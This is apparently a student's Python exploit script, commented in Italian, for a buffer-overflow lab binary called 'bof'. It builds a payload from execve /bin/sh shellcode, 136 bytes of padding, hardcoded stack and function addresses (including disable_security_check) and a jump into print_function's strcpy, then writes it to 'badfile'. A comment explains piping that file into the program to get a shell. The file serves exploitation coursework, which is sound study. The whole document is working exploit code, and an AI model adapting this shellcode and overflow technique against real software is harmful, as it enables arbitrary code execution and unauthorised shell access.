#eseguire lo shellcode sfruttando la strcpy definita nella print_function

import os
import struct

#shellcode solito --> con lo shellcode bisogna invocare: cat badfile - | ./bof perche` se no non si vede la shell
shellcode = (b"\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80")

#per arrivare alla strcpy di print_function devo riuscire a mettere a 0 security quindi devo chiamare disable_security_check

print_function = 0x8048559
disable_security = 0x804852b

#pdisass print_function per overflow su dst
#[ebp-0x84] --> 84 e` 4+(16*8)=132 + ebp quindi 4 = 136

#mi serve la x stampata a video
x = 1804289383
#poi serve il buffer destinazione per l'injection vector
dst = 0xbffff1d8

#nota: prima ci va lo shellcode perche` e` cio` che, alla fine, andra` a sovrascrivere il return address
payload = shellcode
payload += "A"*(136 - len(shellcode))

#sono arrivata subito prima del canary, devo sostituirlo con il valore di x stampato a video
#payload += struct.pack("I", x)
#payload += "B"*(136 - len(payload))

#buffer destinazione
payload += struct.pack("I", dst)

#payload = "A"*273 #perche` prima c'e` da gestire l'overflow su dst in print_function
padding = 273 - len(payload)
payload += "Z"*padding
payload += struct.pack("I", disable_security)

f = open("badfile", "a")
f.write("%s" % payload)
f.close()
